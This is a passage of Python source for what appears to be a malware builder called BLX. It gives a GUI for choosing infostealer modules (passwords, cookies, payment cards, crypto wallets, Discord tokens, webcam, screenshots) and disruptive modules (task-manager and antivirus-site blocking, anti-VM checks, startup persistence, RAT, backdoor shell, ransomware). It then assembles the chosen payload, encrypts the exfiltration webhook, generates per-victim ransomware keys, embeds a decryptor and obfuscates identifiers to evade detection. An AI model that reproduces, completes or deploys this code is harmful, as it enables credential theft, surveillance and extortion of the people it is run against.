    option_interesting_files_cb         = ctk.CTkCheckBox(options_stealer_frame, text="Interesting Files",      variable=option_interesting_files_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_webcam_cb                    = ctk.CTkCheckBox(options_stealer_frame, text="Webcam",                 variable=option_webcam_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_screenshot_cb                = ctk.CTkCheckBox(options_stealer_frame, text="Screenshot",             variable=option_screenshot_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    
    option_block_key_cb                 = ctk.CTkCheckBox(options_malware_frame, text="Block Key",              variable=option_block_key_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_block_mouse_cb               = ctk.CTkCheckBox(options_malware_frame, text="Block Mouse",            variable=option_block_mouse_var,               onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_block_task_manager_cb        = ctk.CTkCheckBox(options_malware_frame, text="Block Task Manager",     variable=option_block_task_manager_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_block_website_cb             = ctk.CTkCheckBox(options_malware_frame, text="Block AV Website",       variable=option_block_website_var,             onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_shutdown_cb                  = ctk.CTkCheckBox(options_malware_frame, text="Shutdown",               variable=option_shutdown_var,                  onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_message_popup_cb            = ctk.CTkCheckBox(options_malware_frame, text="Message Popup",          variable=option_message_popup_var,            onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'], command=CreateMessagePopupWindow)
    option_spam_open_programs_cb        = ctk.CTkCheckBox(options_malware_frame, text="Spam Open Program",      variable=option_spam_open_programs_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_spam_create_files_cb         = ctk.CTkCheckBox(options_malware_frame, text="Spam Create File",       variable=option_spam_create_files_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_anti_vm_and_debug_cb         = ctk.CTkCheckBox(options_malware_frame, text="Anti VM & Debug",        variable=option_anti_vm_and_debug_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_startup_cb                   = ctk.CTkCheckBox(options_malware_frame, text="Launch at Startup",      variable=option_startup_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_restart_cb                   = ctk.CTkCheckBox(options_malware_frame, text="Restart Every 5min",     variable=option_restart_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_rat_cb                       = ctk.CTkCheckBox(options_malware_frame, text="RAT",                   variable=option_rat_var,                       onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'], command=CreateRatWindow)
    option_backdoor_cb                 = ctk.CTkCheckBox(options_malware_frame, text="Backdoor (Shell)",     variable=option_backdoor_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'], command=CreateBackdoorWindow)
    option_ransomware_cb               = ctk.CTkCheckBox(options_malware_frame, text="Ransomware",            variable=option_ransomware_var,               onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'], command=CreateRansomwareWindow)

    option_system_cb.grid(                   row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
    option_wallets_cb.grid(                  row=2, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_game_launchers_cb.grid(           row=3, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_apps_cb.grid(                     row=4, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_roblox_cb.grid(                   row=5, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_discord_cb.grid(                  row=6, column=0, padx=(60, 0), pady=3,      sticky="nswe")

    option_discord_injection_cb.grid(        row=1, column=1, padx=(0, 0),  pady=(18,3), sticky="nswe")
    option_passwords_cb.grid(                row=2, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_cookies_cb.grid(                  row=3, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_history_cb.grid(                  row=4, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_downloads_cb.grid(                row=5, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_cards_cb.grid(                    row=6, column=1, padx=(0, 0),  pady=3,      sticky="nswe")

    option_extentions_cb.grid(               row=1, column=2, padx=(0, 0),  pady=(18,3), sticky="nswe")
    option_interesting_files_cb.grid(        row=2, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
    option_webcam_cb.grid(                   row=3, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
    option_screenshot_cb.grid(               row=4, column=2, padx=(0, 0),  pady=3,      sticky="nswe")

    option_block_key_cb.grid(                row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
    option_block_mouse_cb.grid(              row=2, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_block_task_manager_cb.grid(       row=3, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_block_website_cb.grid(            row=4, column=0, padx=(60, 0), pady=3,      sticky="nswe")

    option_spam_open_programs_cb.grid(       row=1, column=1, padx=(0, 0),  pady=(18,3), sticky="nswe")
    option_spam_create_files_cb.grid(        row=2, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_shutdown_cb.grid(                 row=3, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_message_popup_cb.grid(            row=4, column=1, padx=(0, 0),  pady=3,      sticky="nswe")

    option_anti_vm_and_debug_cb.grid(        row=1, column=2, padx=(0, 0),  pady=(18,3), sticky="nswe")
    option_startup_cb.grid(                  row=2, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
    option_restart_cb.grid(                  row=3, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
    option_rat_cb.grid(                     row=5, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_backdoor_cb.grid(                row=5, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_ransomware_cb.grid(              row=5, column=2, padx=(0, 0),  pady=3,      sticky="nswe")

    build_frame = ctk.CTkFrame(builder, width=720, height=40, fg_color=colors["background"]) 
    build_frame.grid(row=4, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    build_frame.grid_propagate(False)
    build_frame.grid_columnconfigure(0, weight=1)
    build_frame.grid_columnconfigure(1, weight=1)
    build_frame.grid_columnconfigure(2, weight=1)

    name_file_entry = ctk.CTkEntry(build_frame, height=30, width=140, corner_radius=5, font=ctk.CTkFont(family="Helvetica", size=12), justify="center", border_color=colors["red"], text_color=colors['white'], fg_color=colors["dark_gray"], border_width=2, placeholder_text="File Name")
    name_file_entry.grid(row=1, column=0, padx=0, sticky="w", pady=0)

    def FileTypeChanged(*args):
        if file_type_var.get() == "Python File":
            icon_button.configure(state="disabled")
        elif file_type_var.get() == "File Type":
            icon_button.configure(state="disabled")
        else:
            icon_button.configure(state="normal")

    file_type_menu = ctk.CTkOptionMenu(build_frame, height=30, width=140, font=ctk.CTkFont(family="Helvetica", size=12), variable=file_type_var, values=["Python File", "Exe File"], fg_color=colors['dark_gray'], button_color=colors["red"], button_hover_color=colors['dark_red'])
    file_type_menu.grid(row=1, column=2, sticky="w", padx=0, pady=0)

    icon_button = ctk.CTkButton(build_frame, height=30, width=140, text="Select Icon", command=ChooseIcon, fg_color=colors["red"], hover_color=colors["dark_red"], text_color_disabled=colors["light_gray"])
    icon_button.grid(row=1, column=2, sticky="e", padx=0, pady=0)
    icon_button.configure(state="disabled")
    file_type_var.trace_add("write", lambda *args: FileTypeChanged())

    build_frame.grid_columnconfigure(0, minsize=0)

    def BuildSettings():
        global option_system, option_game_launchers, option_wallets, option_apps, option_discord, option_discord_injection, option_passwords, option_cookies, option_history, option_downloads, option_cards, option_extentions, option_interesting_files, option_roblox, option_webcam, option_screenshot, option_block_key, option_block_mouse, option_block_task_manager, option_block_website, option_spam_open_programs, option_spam_create_files, option_shutdown, option_message_popup, option_startup, option_restart, option_anti_vm_and_debug, option_rat, option_backdoor, option_ransomware, ransomware_webhook_url, webhook, name_file, file_type, icon_path
        option_system                    = option_system_var.get()
        option_game_launchers            = option_game_launchers_var.get()
        option_wallets                   = option_wallets_var.get()
        option_apps                      = option_apps_var.get()
        option_discord                   = option_discord_var.get()
        option_discord_injection         = option_discord_injection_var.get()
        option_passwords                 = option_passwords_var.get()
        option_cookies                   = option_cookies_var.get()
        option_history                   = option_history_var.get()
        option_downloads                 = option_downloads_var.get()
        option_cards                     = option_cards_var.get()
        option_extentions                = option_extentions_var.get()
        option_interesting_files         = option_interesting_files_var.get()
        option_roblox                    = option_roblox_var.get()
        option_webcam                    = option_webcam_var.get()
        option_screenshot                = option_screenshot_var.get()
        option_block_website             = option_block_website_var.get()
        option_block_key                 = option_block_key_var.get()
        option_block_mouse               = option_block_mouse_var.get()
        option_block_task_manager        = option_block_task_manager_var.get()
        option_shutdown                  = option_shutdown_var.get()
        option_spam_open_programs        = option_spam_open_programs_var.get()
        option_spam_create_files         = option_spam_create_files_var.get()
        option_message_popup            = option_message_popup_var.get()
        option_startup                   = option_startup_var.get()
        option_restart                   = option_restart_var.get()
        option_anti_vm_and_debug         = option_anti_vm_and_debug_var.get()
        option_rat                       = option_rat_var.get()
        option_backdoor                  = option_backdoor_var.get()
        option_ransomware                = option_ransomware_var.get()
        webhook                          = webhook_url.get()
        name_file                        = name_file_entry.get()
        file_type                        = file_type_var.get()

        if option_ransomware == "Enable":
            if not ransomware_bot_token.strip() or not ransomware_server_id.strip():
                ErrorLogs("Ransomware is enabled. Please configure it: open Ransomware config (check the box) and enter Bot Token and Server ID.")
                return
            if not ransomware_webhook_url.strip():
                ransomware_webhook_url = webhook_url.get().strip()
            if not ransomware_webhook_url or not ransomware_webhook_url.strip():
                ErrorLogs("Ransomware is enabled. Enter a webhook URL in Ransomware config or ensure the main webhook is set.")
                return
        if option_rat == "Enable" and (not rat_bot_token.strip() or not rat_server_id.strip()):
            ErrorLogs("RAT is enabled. Please configure it: open RAT config (check the box) and enter Bot Token and Server ID.")
            return
        if option_backdoor == "Enable" and (not backdoor_bot_token.strip() or not backdoor_server_id.strip()):
            ErrorLogs("Backdoor is enabled. Please configure it: open Backdoor config (check the box) and enter Bot Token and Server ID.")
            return
        if not webhook.strip():
            ErrorLogs("Please enter the webhook.")
            return
        
        if not name_file.strip():
            ErrorLogs("Please choose the file name.")
            return
        
        if file_type == "File Type":
            ErrorLogs("Please choose the file type.")
            return
        
        ClosingBuild()

    build = ctk.CTkButton(builder, text="Build", command=BuildSettings, height=40, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
    build.grid(row=5, column=0, padx=330, pady=30, sticky="nswe")

    builder.protocol("WM_DELETE_WINDOW", ClosingWindow)

    builder.mainloop()

    try:
        if not exit_window and builder.winfo_exists():
            _safe_destroy()
    except Exception:
        pass

    time.sleep(1)

    if file_type == "File Type" or file_type == "None" or not name_file.strip() or name_file == "None" or not webhook.strip() or webhook == "None":
        ErrorLogs("You have closed the page, so your virus will not be built.")
        Continue()
        Reset()

    option_extentions                = option_extentions_var.get()
    option_interesting_files         = option_interesting_files_var.get()
    option_rat                       = option_rat_var.get()
    option_backdoor                  = option_backdoor_var.get()
    option_ransomware                = option_ransomware_var.get()   

    print(f"""
    {red}Stealer Options:{white}
    {option_system            } System Info            {option_discord_injection } Discord Injection      {option_extentions       } Extentions
    {option_wallets           } Wallets Session Files  {option_passwords         } Passwords              {option_interesting_files} Interesting Files                   
    {option_game_launchers    } Games Session Files    {option_cookies           } Cookies                {option_webcam           } Webcam 
    {option_apps              } Telegram Session Files {option_history           } Browsing History       {option_screenshot       } Screenshot
    {option_roblox            } Roblox Accounts        {option_downloads         } Download History
    {option_discord           } Discord Accounts       {option_cards             } Cards

    {red}Malware Options:{white}
    {option_block_key         } Block Key              {option_shutdown          } Shutdown               {option_anti_vm_and_debug} Anti VM & Debug
    {option_block_mouse       } Block Mouse            {option_message_popup     } Message Popup         {option_startup          } Launch at Startup
    {option_block_task_manager} Block Task Manager     {option_spam_open_programs} Spam Open Program      {option_restart          } Restart Every 5min
    {option_block_website     } Block AV Website       {option_spam_create_files } Spam Create File
    {option_rat               } RAT                    {option_backdoor         } Backdoor (Shell)       {option_ransomware       } Ransomware
""".replace(f"Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace(f"Disable", f"{BEFORE}x{AFTER}"))

    if option_message_popup == "Enable":
        print(f"""{red}Message Popup Type   : {white + popup_type}
{red}Message Popup Title  : {white + popup_title}
{red}Message Popup Message: {white + popup_message}""")
    if option_rat == "Enable":
        print(f"""{red}RAT Bot Token : {white + (rat_bot_token[:30] + '...' if len(rat_bot_token) > 30 else rat_bot_token)}
{red}RAT Server ID : {white + rat_server_id} | Persistence: {rat_persistence} | Admin required: {rat_admin_required}""")
    if option_backdoor == "Enable":
        print(f"""{red}Backdoor Bot Token : {white + (backdoor_bot_token[:30] + '...' if len(backdoor_bot_token) > 30 else backdoor_bot_token)}
{red}Backdoor Server ID : {white + backdoor_server_id} | Persistence: {backdoor_persistence} | Admin required: {backdoor_admin_required}""")
    if option_ransomware == "Enable":
        print(f"""{red}Ransomware Bot Token : {white + (ransomware_bot_token[:30] + '...' if len(ransomware_bot_token) > 30 else ransomware_bot_token)}
{red}Ransomware Server ID  : {white + ransomware_server_id}
{red}Ransomware Webhook    : {white + (ransomware_webhook_url[:60] + '...' if len(ransomware_webhook_url) > 60 else ransomware_webhook_url or '(main)')}""")

    print(f"""{red}Webhook   : {white + webhook[:90] + '..'}
{red}File Type : {white + file_type}
{red}File Name : {white + name_file}""")

    if icon_path and icon_path != "None":
        if 100 < len(icon_path):
            icon_path_cut = icon_path[:100] + '..'
        else:
            icon_path_cut = icon_path
        print(f"{red}Icon Path : {white + icon_path_cut}")
    
    def Encryption(webhook):
        def Encrypt(decrypted, key):
            def DeriveKey(password, salt):
                kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
                if isinstance(password, str):  
                    password = password.encode()  
                return kdf.derive(password)
            
            salt = os.urandom(16)
            derived_key = DeriveKey(key, salt)
            iv = os.urandom(16)
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(decrypted.encode()) + padder.finalize()
            cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            encrypted_message = salt + iv + encrypted_data
            return base64.b64encode(encrypted_message).decode()
        
        key_encryption = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=random.randint(100,200)))
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Encryption key created: {white + key_encryption[:75] + '..'}")
        webhook_encrypted = Encrypt(webhook, key_encryption)
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Encrypted webhook: {white + webhook_encrypted[:75] + '..'}")

        return key_encryption, webhook_encrypted
    
    def PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted):
        if file_type in ["Exe File", "Python File"]:
            try:
                browser_choice = []
                if option_extentions == 'Enable':
                    browser_choice.append('"extentions"')
                if option_passwords == 'Enable':
                    browser_choice.append('"passwords"')
                if option_cookies == 'Enable':
                    browser_choice.append('"cookies"')
                if option_history == 'Enable':
                    browser_choice.append('"history"')
                if option_downloads == 'Enable':
                    browser_choice.append('"downloads"')
                if option_cards == 'Enable':
                    browser_choice.append('"cards"')

                session_files_choice = []
                if option_wallets == 'Enable':
                    session_files_choice.append('"Wallets"')
                if option_game_launchers == 'Enable':
                    session_files_choice.append('"Game Launchers"')
                if option_apps == 'Enable':
                    session_files_choice.append('"Apps"')

                rw_key_b64 = ""
                rw_victim_id = ""
                rw_decryptor_b64 = ""
                if option_ransomware == 'Enable':
                    try:
                        rw_key = os.urandom(32)
                        rw_victim_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
                        rw_key_b64 = base64.b64encode(rw_key).decode('ascii')
                        keys_path = os.path.join(os.path.dirname(file_python), "BLX_ransomware_keys.json")
                        data = {}
                        if os.path.exists(keys_path):
                            try:
                                with open(keys_path, 'r', encoding='utf-8') as kf:
                                    data = json.load(kf)
                            except Exception:
                                pass
                        data[rw_victim_id] = rw_key_b64
                        with open(keys_path, 'w', encoding='utf-8') as kf:
                            json.dump(data, kf, indent=2)
                        rw_keys_in_ransomware = os.path.join(tool_path, "Ransomware", "BLX_ransomware_keys.json")
                        try:
                            os.makedirs(os.path.dirname(rw_keys_in_ransomware), exist_ok=True)
                            with open(rw_keys_in_ransomware, 'w', encoding='utf-8') as kf:
                                json.dump(data, kf, indent=2)
                        except Exception:
                            pass
                        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Ransomware Victim ID : {white + rw_victim_id}")
                        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Ransomware keys saved: {white + keys_path}")
                        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Keys also in: {white}Ransomware\\BLX_ransomware_keys.json")
                        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Run bot: {white}python Ransomware\\BLX_Ransomware_Bot.py")
                    except Exception as e:
                        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Ransomware key generation failed: {white + str(e)}")
                    try:
                        import subprocess
                        _dec_src = _get_blx_decryptor_source()
                        _dec_tmp = os.path.join(tempfile.gettempdir(), "BLX_Decryptor_build_%s.py" % os.getpid())
                        decryptor_exe = os.path.join(tool_path, "dist", "BLX_Decryptor.exe")
                        try:
                            with open(_dec_tmp, "w", encoding="utf-8") as _f:
                                _f.write(_dec_src)
                            print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Building BLX_Decryptor.exe (embedded on desktop when payload runs)... {reset}")
                            _cwd = tool_path
                            _cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--windowed", "--name", "BLX_Decryptor", "--clean", "-y", _dec_tmp]
                            _icon_dec = os.path.join(tool_path, "Img", "7752569.ico")
                            if os.path.isfile(_icon_dec):
                                _cmd.extend(["--icon", _icon_dec])
                            _flags = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000) if sys.platform.startswith("win") else 0
                            subprocess.run(_cmd, cwd=_cwd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180, creationflags=_flags)
                            if os.path.isfile(decryptor_exe):
                                with open(decryptor_exe, "rb") as _f:
                                    rw_decryptor_b64 = base64.b64encode(_f.read()).decode("ascii")
                                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} BLX_Decryptor.exe embedded (will be dropped on desktop). {white}")
                            else:
                                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} BLX_Decryptor.exe build failed; decryptor will not be dropped. {white}")
                        finally:
                            try:
                                if os.path.isfile(_dec_tmp):
                                    os.remove(_dec_tmp)
                            except Exception:
                                pass
                            for _d in [os.path.join(tool_path, "build", "BLX_Decryptor"), os.path.join(tool_path, "dist", "BLX_Decryptor.exe"), os.path.join(tool_path, "BLX_Decryptor.spec")]:
                                try:
                                    if os.path.isfile(_d):
                                        os.remove(_d)
                                    elif os.path.isdir(_d):
                                        shutil.rmtree(_d, ignore_errors=True)
                                except Exception:
                                    pass
                    except Exception as e:
                        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Decryptor build failed: {white + str(e)}")

                with open(file_python, 'w', encoding='utf-8') as file:

                    if option_anti_vm_and_debug == 'Enable':
                        file.write(Ant1VM4ndD3bug)

                    file.write(Obligatory.replace("%WEBHOOK_URL%", webhook_encrypted).replace("%KEY%", key_encryption).replace("%LINK_AVATAR%", avatar_webhook).replace("%LINK_GITHUB%", github_tool).replace("%LINK_WEBSITE%", website))

                    if option_system == 'Enable':
                        file.write(Sy5t3mInf0)

                    if option_discord == 'Enable':
                        file.write(Di5c0rdAccount)

                    if option_discord_injection == 'Enable':
                        file.write(Di5c0rdIj3ct10n)

                    if option_interesting_files == 'Enable':
                        file.write(Int3r3stingFil3s)

                    if session_files_choice:
                        file.write(S3ssi0nFil3s.replace('"%SESSION_FILES_CHOICE%"', ', '.join(session_files_choice)))

                    if browser_choice:
                        file.write(Br0w53r5t341.replace('"%BROWSER_CHOICE%"', ', '.join(browser_choice)))

                    if option_roblox == 'Enable':
                        file.write(R0b10xAccount)

                    if option_webcam == 'Enable':
                        file.write(W3bc4m)

                    if option_screenshot == 'Enable':
                        file.write(Scr33n5h0t)

                    if option_block_key == 'Enable':
                        file.write(B10ckK3y)

                    if option_block_mouse == 'Enable':
                        file.write(B10ckM0u53)

                    if option_block_task_manager == 'Enable':
                        file.write(B10ckT45kM4n4g3r)

                    if option_block_website == 'Enable':
                        file.write(B10ckW3b5it3)

                    if option_message_popup == 'Enable':
                        file.write(M3ss4g3P0pup(popup_title, popup_message, popup_type))

                    if option_spam_open_programs == 'Enable':
                        file.write(Sp4m0p3nPr0gr4m)

                    if option_spam_create_files == 'Enable':
                        file.write(Sp4mCr34tFil3)

                    if option_shutdown == 'Enable':
                        file.write(Shutd0wn)

                    if option_startup == 'Enable':
                        file.write(St4rtup)

                    if option_spam_open_programs == 'Enable' or option_block_mouse == 'Enable' or option_spam_create_files == 'Enable':
                        file.write(Sp4mOpti0ns)

                    if option_restart == 'Enable':
                        file.write(R3st4rt)

                    if option_rat == 'Enable':
                        file.write(R4tC0d3.replace("%RAT_BOT_TOKEN%", rat_bot_token).replace("%RAT_SERVER_ID%", rat_server_id).replace("%RAT_PERSISTENCE%", rat_persistence).replace("%RAT_ADMIN_REQUIRED%", rat_admin_required))

                    if option_backdoor == 'Enable':
                        file.write(B4ckd00rC0d3.replace("%BACKDOOR_BOT_TOKEN%", backdoor_bot_token).replace("%BACKDOOR_SERVER_ID%", backdoor_server_id).replace("%BACKDOOR_PERSISTENCE%", backdoor_persistence).replace("%BACKDOOR_ADMIN_REQUIRED%", backdoor_admin_required))

                    if option_ransomware == 'Enable' and rw_key_b64 and rw_victim_id:
                        rw_url_raw = (ransomware_webhook_url or webhook or "").strip()
                        rw_url_raw = "".join(c for c in rw_url_raw if c not in "\n\r\x00")
                        rw_webhook_safe = rw_url_raw.replace("\\", "\\\\").replace('"', '\\"')
                        rw_dec_b64 = rw_decryptor_b64 if (option_ransomware == 'Enable' and rw_decryptor_b64) else ""
                        rw_exfil_tok = (ransomware_exfil_token or "").strip()
                        rw_exfil_tok = "".join(c for c in rw_exfil_tok if c not in "\n\r\x00")
                        rw_exfil_tok_safe = rw_exfil_tok.replace("\\", "\\\\").replace('"', '\\"') if rw_exfil_tok else "%RANSOMWARE_EXFIL_TOKEN%"
                        rw_exfil_chan = (ransomware_exfil_channel_id or "").strip()
                        rw_exfil_chan = "".join(c for c in rw_exfil_chan if c not in "\n\r\x00")
                        rw_exfil_chan_safe = rw_exfil_chan if rw_exfil_chan else "%RANSOMWARE_EXFIL_CHANNEL_ID%"
                        rw_excluded_ext = (ransomware_excluded_ext or "").strip().replace("\\", "\\\\").replace('"', '\\"')[:500]
                        rw_excluded_paths = (ransomware_excluded_paths or "").strip().replace("\\", "\\\\").replace('"', '\\"').replace("\n", ",")[:1000]
                        _rw_txt = (ransomware_readme_text or "").strip()
                        rw_readme_b64 = base64.b64encode(_rw_txt.encode("utf-8", errors="replace")).decode("ascii") if _rw_txt else ""
                        try:
                            rw_delay_sec = max(0, min(86400, int(ransomware_delay_sec or "0")))
                        except Exception:
                            rw_delay_sec = 0
                        file.write(RansomwareC0d3.replace("%RANSOMWARE_WEBHOOK_URL%", rw_webhook_safe).replace("%RANSOMWARE_KEY_B64%", rw_key_b64).replace("%RANSOMWARE_VICTIM_ID%", rw_victim_id).replace("%RANSOMWARE_DECRYPTOR_B64%", rw_dec_b64).replace("%RANSOMWARE_EXFIL_TOKEN%", rw_exfil_tok_safe).replace("%RANSOMWARE_EXFIL_CHANNEL_ID%", rw_exfil_chan_safe).replace("%RANSOMWARE_EXCLUDED_EXT%", rw_excluded_ext).replace("%RANSOMWARE_EXCLUDED_PATHS%", rw_excluded_paths).replace("%RANSOMWARE_README_B64%", rw_readme_b64).replace("%RANSOMWARE_DELAY_SEC%", str(rw_delay_sec)))

                    file.write(St4rt)

                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Python file created: {white + file_python_relative}")
            except Exception as e:
                print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Python file not created: {white + e}")
                Continue()
                Reset()

    def PythonIdentifierObfuscation(file_python):
        if file_type in ["Exe File", "Python File"]:
            try:
                variable_map = {}

                def RandomName():
                    return ''.join(random.choices(string.ascii_uppercase, k=random.randint(50,100)))

                with open(file_python, 'r', encoding='utf-8') as file:
                    original_script = file.read()

                def visit_node(node):
                    if isinstance(node, ast.Assign):
                        for target in node.targets:
                            if isinstance(target, ast.Name):
                                var_name = target.id
                                if var_name not in variable_map and "v4r_" in var_name:
                                    new_name = RandomName()
                                    variable_map[var_name] = new_name
                                    target.id = new_name

                    elif isinstance(node, ast.FunctionDef):
                        if "D3f_" in node.name: 
                            if node.name not in variable_map:
                                new_name = RandomName()
                                variable_map[node.name] = new_name
                                node.name = new_name 
                            for arg in node.args.args:
                                var_name = arg.arg
                                if var_name not in variable_map and "v4r_" in var_name:
                                    new_name = RandomName()
                                    variable_map[var_name] = new_name
                                    arg.arg = new_name

                    elif isinstance(node, ast.ClassDef):
                        if node.name not in variable_map and "v4r_" in node.name:
                            new_name = RandomName()
                            variable_map[node.name] = new_name
                            node.name = new_name

                    for child in ast.iter_child_nodes(node):
                        visit_node(child)

                tree = ast.parse(original_script)
                visit_node(tree)

                with open(file_python, 'r', encoding='utf-8') as file:
                    lines = file.readlines()

                import re
                sorted_vars = sorted(variable_map.items(), key=lambda x: -len(x[0]))
                with open(file_python, 'w', encoding='utf-8') as file:
                    for line in lines:
                        for var_name, new_name in sorted_vars:
                            if var_name in line:
                                line = re.sub(r'(?<![a-zA-Z0-9_])' + re.escape(var_name) + r'(?![a-zA-Z0-9_])', new_name, line)
                        file.write(line)


                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} All the Identifiers of the python file were obfuscated.")
            except: pass

    def SendWebhook(webhook):
        embed_config = {
            'title': f'V1ru5 Created (Config):',
            'color': color_webhook,
            "fields": [
                {"name": f"Name:",                   "value": f"""```{name_file}```""",                        "inline": True},
                {"name": f"Type:",                   "value": f"""```{file_type}```""",                        "inline": True},
                {"name": f"Webhook:",                "value": f"""{webhook}""",                                "inline": False},
            ],
            'footer': {
                "text": "BLX | benzoXdev",
                "icon_url": avatar_creator,
                }
            }
        
        embed_stealer = {
            'title': f'V1ru5 Created (St34l3r):',
            'color': color_webhook,
            "fields": [
                {"name": f"System Info:",            "value": f"""```{option_system}```""",                    "inline": True},
                {"name": f"Wallets Session Files:",  "value": f"""```{option_wallets}```""",            "inline": True},
                {"name": f"Games Session Files:",    "value": f"""```{option_game_launchers}```""",            "inline": True},
                {"name": f"Telegram Session Files:", "value": f"""```{option_apps}```""",                      "inline": True},
                {"name": f"Roblox Accounts:",        "value": f"""```{option_roblox}```""",                    "inline": True},
                {"name": f"Discord Accounts:",       "value": f"""```{option_discord}```""",                   "inline": True},
                {"name": f"Discord Injection:",      "value": f"""```{option_discord_injection}```""",         "inline": True},
                {"name": f"Passwords:",              "value": f"""```{option_passwords}```""",                 "inline": True},
                {"name": f"Cookies:",                "value": f"""```{option_cookies}```""",                   "inline": True},
                {"name": f"Browsing History:",       "value": f"""```{option_history}```""",                   "inline": True},
                {"name": f"Download History:",       "value": f"""```{option_downloads}```""",                 "inline": True},
                {"name": f"Cards:",                  "value": f"""```{option_cards}```""",                     "inline": True},
                {"name": f"Extentions:",             "value": f"""```{option_extentions}```""",                "inline": True},
                {"name": f"Interesting Files:",      "value": f"""```{option_interesting_files}```""",         "inline": True},
                {"name": f"Webcam:",                 "value": f"""```{option_webcam}```""",                    "inline": True},
